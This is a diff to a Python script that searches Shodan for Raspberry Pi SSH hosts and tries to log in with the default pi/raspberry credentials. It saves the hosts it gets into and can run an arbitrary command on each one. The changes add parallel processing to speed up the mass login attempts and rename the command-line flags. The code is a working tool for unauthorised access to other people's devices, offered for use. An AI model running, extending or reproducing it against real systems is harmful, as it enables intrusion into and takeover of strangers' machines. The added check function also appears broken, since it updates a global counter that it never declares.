@@ -1,11 +1,12 @@
 #!/usr/bin/env python3
 
 import argparse, os, socket, sys, time
+from multiprocessing import Pool
 try:
 	from colorama import Fore, init
 	import paramiko, shodan
-except ModuleNotFoundError:
-	print('[-] Failed to import an external module.')
+except ModuleNotFoundError as e:
+	print('[-] Failed to import an external module. (%s)' % (e))
 	import platform
 	if platform.system() == 'Linux':
 		print('    Run "pip install -r requirements.txt".')
@@ -26,56 +27,63 @@ ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()) # Revert to AutoAddPol
 
 parser = argparse.ArgumentParser()
 parser.add_argument('-i',
-                    help='List of IPs',
-                    metavar='FILE',
-                    type=str,
-                    default=None) # Input file argument, by default it writes to memory (list/array)
-parser.add_argument('--indefinite',
-                    help='Run indefinitely, restarting once the scan is finished',
-                    action='store_true') # Don't exit on completion, but instead poll Shodan again
+					help='List of IPs',
+					metavar='FILE',
+					type=str,
+					default=None) # Input file argument, by default it writes to memory (list/array)
+parser.add_argument('-indefinite',
+					help='Run indefinitely, restarting once the scan is finished',
+					action='store_true') # Don't exit on completion, but instead poll Shodan again
 parser.add_argument('-k',
-                    help='Use KEY as the Shodan API key',
-                    metavar='KEY',
-                    type=str,
-                    default=api_key) # API Key (the error on startup can be resolved by changing the api_key variable)
-parser.add_argument('--paramiko-log',
-                    help='Log Paramiko SSH\'s progress to FILE',
-                    metavar='FILE',
-                    type=str) # Paramiko (the SSH client)'s log file location
-parser.add_argument('-w',
-                    help='Output successful IPs to FILE',
-                    metavar='FILE',
-                    type=str,
-                    default='successful.txt') # Where to output successful IPs
+					help='Use KEY as the Shodan API key',
+					metavar='KEY',
+					type=str,
+					default=api_key) # API Key (the error on startup can be resolved by changing the api_key variable)
+parser.add_argument('-paramiko-log',
+					help='Log Paramiko SSH\'s progress to FILE',
+					metavar='FILE',
+					type=str) # Paramiko (the SSH client)'s log file location
+parser.add_argument('-o',
+					help='Output successful IPs to FILE',
+					metavar='FILE',
+					type=str,
+					default='successful.txt') # Where to output successful IPs
 parser.add_argument('-u',
-                    help='Use alternate username',
-                    type=str,
-                    default='pi') # For alternate usernames
+					help='Use alternate username',
+					type=str,
+					default='pi') # For alternate usernames
 parser.add_argument('-p',
-                    help='Use alternate password',
-                    type=str,
-                    default='raspberry') # For alternate passwords
-parser.add_argument('--debug',
-                    help='Show debug information',
-                    action='store_true')
-parser.add_argument('--query-string',
-                    help='Use SSTRING as the Shodan query string',
-                    metavar='SSTRING',
-                    type=str,
-                    default='Raspbian SSH')
-parser.add_argument('--ssh-key',
-                    help='Try auth with KEY as SSH key',
-                    metavar='KEY',
-                    type=str) # Public key auth (disabled with Shodan)
+					help='Use alternate password',
+					type=str,
+					default='raspberry') # For alternate passwords
+parser.add_argument('-t',
+					help='Threads for multiprocessing',
+					type=int,
+					default=8)
+parser.add_argument('-debug',
+					help='Show debug information',
+					action='store_true')
+parser.add_argument('-query-string',
+					help='Use SSTRING as the Shodan query string',
+					metavar='SSTRING',
+					type=str,
+					default='Raspbian SSH')
+parser.add_argument('-ssh-key',
+					help='Try auth with KEY as SSH key',
+					metavar='KEY',
+					type=str) # Public key auth (disabled with Shodan)
 parser.add_argument('-c',
-                    help='Run CMD after a successful connection',
-                    metavar='CMD',
-                    type=str) # For example, run uname -a or lscpu
-parser.add_argument('--limit',
-		    help='Maximum number of results to get from Shodan (default 100)',
-		    metavar='RESULTS',
-		    type=str,
-		    default=100)
+					help='Run CMD after a successful connection',
+					metavar='CMD',
+					type=str) # For example, run uname -a or lscpu
+parser.add_argument('-limit',
+					help='Maximum number of results to get from Shodan (default 100)',
+					metavar='RESULTS',
+					type=str,
+					default=100)
+parser.add_argument('-enable-multiproc',
+					help='Enable multiprocessing support (ALPHA/UNSTABLE)',
+					action='store_true')
 args = parser.parse_args()
 
 failtext = Fore.RED + '\tFAILED' + Fore.RESET
@@ -151,7 +159,7 @@ def connect(server, username, password=None, key=None, cmd=None):
 			ssh.connect(server, username=username, password=password, timeout=5, look_for_keys=False)
 		elif key != None:
 			ssh.connect(server, username=username, key_filename=key, timeout=5)
-		with open(args.w, 'a') as fl:
+		with open(args.o, 'a') as fl:
 			fl.write(server)
 			if args.c:
 				si, so, se = ssh.exec_command(cmd)
@@ -177,7 +185,53 @@ def connect(server, username, password=None, key=None, cmd=None):
 	except:
 		return 5 # Unknown
 
+def check(ip):
+	"""
+		Single-threaded check function - most stable
+	"""
+	counter += 1
+	print('[%s] %s ' % (counter, ip), end='')
+	r = connect(ip, args.u, password=args.p, key=args.ssh_key, cmd=args.c)
+	if r == 1:
+		reason = ' [AUTHERR]' if args.debug else ''
+		print((failtext + reason))
+	elif r == 2 or r == 4:
+		reason = ' [GENERAL]' if args.debug else ''
+		print((failtext + reason))
+	elif r == 3:
+		reason = ' [TIMEOUT]' if args.debug else ''
+		print((failtext + reason))
+	elif r == 5:
+		reason = ' [UNKNOWN]' if args.debug else ''
+		print((failtext + reason))
+	elif r == 9:
+		raise KeyboardInterrupt
+	else:
+		success += 1
+		if not args.c:
+			print(succtext)
+		else:
+			try:
+				print('\t%s' % r[0].replace('\n', ''))
+			except IndexError:
+				print('\t[CMDREAD_FAIL]')
+
+def check_multi(ip):
+	"""
+		Multi-threaded check function - only shows successful IPs, no counters, for now no error handling
+	"""
+	if args.debug:
+		print("[D] Multiproc - check IP %s" % ip)
+	r = connect(ip, args.u, password=args.p, key=args.ssh_key, cmd=args.c)
+	if args.c:
+		try:
+			print('%s -- %s' % (ip, r[0].replace('\n', '')))
+		except IndexError:
+			print('%s -- NO OUTPUT' % ip)
+
 def main():
+	global counter
+	global success
 	counter = 0
 	success = 0
 	if not fileCorrect():
@@ -190,33 +244,14 @@ def main():
 		targets = fileGet(shodandata=shres) # From file
 	print((Fore.BLUE + '[i]' + Fore.RESET + ' %s found\n' % (str(len(targets)) + ' target' if len(targets) < 2 else str(len(targets)) + ' targets')))
 	try:
-		for ip in targets:
-			counter += 1
-			print('[%s] %s ' % (counter, ip), end='')
-			r = connect(ip, args.u, password=args.p, key=args.ssh_key, cmd=args.c)
-			if r == 1:
-				reason = ' [AUTHENT]' if args.debug else ''
-				print((failtext + reason))
-			elif r == 2:
-				reason = ' [GENERAL]' if args.debug else ''
-				print((failtext + reason))
-			elif r == 3:
-				reason = ' [TIMEOUT]' if args.debug else ''
-				print((failtext + reason))
-			elif r == 5:
-				reason = ' [UNKNOWN]' if args.debug else ''
-				print((failtext + reason))
-			elif r == 9:
-				raise KeyboardInterrupt
-			else:
-				success += 1
-				if not args.c:
-					print(succtext)
-				else:
-					try:
-						print('\t%s' % r[0].replace('\n', ''))
-					except IndexError as ierr:
-						print('\t[CMDREAD_FAIL]')
+		if not args.enable_multiproc:
+			for ip in targets:
+				check(ip)
+		else:
+			if args.debug:
+				print("[D] Init multiprocessing Pool() with %s threads" % args.t)
+			p = Pool(processes=args.t)
+			result = p.map(check_multi, targets)
 		if not args.indefinite:
 			print(('\n' + Fore.GREEN + '[+]' + Fore.RESET + ' Completed!\n    Total IPs tried: %s\n    Total successes: %s\n' % (counter, success)))
 	except KeyboardInterrupt:
@@ -234,9 +269,11 @@ if __name__ == "__main__":
 			print(('\n' + Fore.BLUE + '[i]' + Fore.RESET + ' Reading from %s' % args.i))
 	else:
 		if args.debug:
-			print(('\n' + Fore.BLUE + '[i]' + Fore.RESET + ' Reading from SHDN:%s' % key))
+			print(('\n' + Fore.BLUE + '[i]' + Fore.RESET + ' Reading from SHODAN:%s' % key))
 		else:
 			print('\n' + Fore.BLUE + '[i]' + Fore.RESET + ' Running with temporary results')
+	if args.enable_multiproc:
+		print(Fore.YELLOW + '[!]' + Fore.RESET + ' Multiprocessing mode enabled! It is NOT stable and may crap out at any moment!')
 	if args.paramiko_log:
 		# Start logging
 		paramiko.util.log_to_file(args.paramiko_log)
@@ -245,7 +282,7 @@ if __name__ == "__main__":
 		while True:
 			main()
 	elif args.indefinite and args.i:
-		print(Fore.RED + '[-]' + Fore.RESET+ ' --indefinite is not available when reading from a file.')
+		print(Fore.RED + '[-]' + Fore.RESET+ ' -indefinite is not available when reading from a file.')
 		sys.exit(1)
 	else:
 		main()
